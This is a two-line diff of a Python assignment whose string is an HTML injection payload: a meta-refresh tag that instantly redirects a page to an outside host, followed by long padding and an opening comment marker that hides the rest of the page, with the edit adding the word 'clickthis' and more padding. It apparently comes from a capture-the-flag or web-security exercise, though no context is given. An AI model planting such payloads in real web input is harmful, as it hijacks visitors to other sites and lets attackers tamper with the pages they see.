@@ -1,2 +1,2 @@
-a = f'<meta http-equiv="refresh" content="0;url=//tyage.net">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa<!--'
+a = f'<meta http-equiv="refresh" content="0;url=//tyage.net">clickthisaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa<!--'
 clickthis
